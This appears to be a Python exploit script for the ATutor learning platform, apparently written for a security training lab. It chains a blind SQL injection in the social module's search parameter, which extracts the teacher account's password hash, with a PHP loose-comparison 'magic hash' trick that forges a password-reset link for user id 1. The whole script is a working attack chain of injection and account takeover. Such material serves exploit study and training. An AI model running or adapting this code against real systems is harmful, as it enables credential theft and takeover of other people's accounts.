import sys
sys.path.append('..')

import asyncio
from lib.mysqli_template_async import get_string
from lib.mysqli_template_async import get_length

import hashlib, string, itertools, re, sys, time
from itertools import takewhile

try:
    import uvloop
    uvloop.install()
except:
    pass


async def main():
    # 1. get teacher hash
    blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
    url = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
    conditional_error = lambda response: int(response.headers['Content-Length']) == 180
    query_encoder = lambda s: s.replace(' ','/**/')
    
    teacher_hash_query = "select password from AT_members where login='teacher'"

    hash_len = await get_length(url, base_query=blind_sqli_truthy, sub_query=teacher_hash_query, response_truth_condition=conditional_error, query_encoder=query_encoder)
    teacher_hash = await  get_string(url=url, base_query=blind_sqli_truthy, sub_query=teacher_hash_query, response_truth_condition=conditional_error, strlen=hash_len, query_encoder=query_encoder)
    print(F"(+) Recovered teacher hash: {teacher_hash}")

    # 2. calculate a magic hash through the g parameter
    curr_pw = teacher_hash
    # when using the + operator on strings, php trunctates the right hand operand at the first character that is not [0-9].
    # If the hand operand begins with [a-zA-Z!-.+{}!@#$%^&*()|\] i.e anything not [0-9] then php truncates the string to 0...
    # So we use itertools to calculate the efferective password. Loose comparison I know., where is c++?
    effective_pw_calc = ''.join(takewhile(str.isdigit, curr_pw or ''))
    effective_pw = int(effective_pw_calc) if effective_pw_calc != '' else '0'
    print("(+) Calculated effective pw: ", effective_pw)
    pw_reset_url = lambda id,g,h: F"http://atutor/ATutor/password_reminder.php?id={id}&g={g}&h={h}"
    current_epoch_days = int(((int(time.time()) / 60) / 60) / 24)       # Calculate current Epoch in days
    count = 1
    prefix_length = 5
    hashes = []
    print(F"(+) current time since unix epoch: {current_epoch_days}")
    for word in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(prefix_length))):
        g = current_epoch_days+count
        h = 0
        id = 1
        hash_val = id + current_epoch_days + count + int(effective_pw)
        hash_full = hashlib.sha1(str(hash_val).encode('utf-8')).hexdigest()
        # Note that in php substr is not equivalent to pythons [start:stop:step]! In other words substr($hash, 5,15) in php grabs 15 characters beggining at position 5 and therefore ends at position 20 in the string
        hash = hashlib.sha1(str(hash_val).encode('utf-8')).hexdigest()[5:20]
        if re.match(r'0+[eE]\d+$', hash):
            hashes.append({'g':str(g),'h':str(h),'id':str(id), 'hash':hash})
            print(F"(+) Hashval: {hash_val}")
            print(F"(+) Full Hash: {hash_full}")
            print(F"(+) Found a valid hash: {hash}")
            print(F"(+) Requests made: {count}")
            '''
            print(F"(+) Parameter Values:\ng = {g}\nh = {h}\nid = {id}")
            '''
            print(F"(+) Equivalent loose comparison: {hash} == 0" )
            if (len(hashes) >= 1):
                break
        count += 1
    for hash in hashes: 
        print(F"(+) Got PW reset link:  {pw_reset_url(hash['id'], hash['g'], hash['h'])}")
if __name__ == "__main__":
    try:
        asyncio.run(main())
    # https://github.com/MagicStack/uvloop/issues/349
    except NotImplementedError:
        pass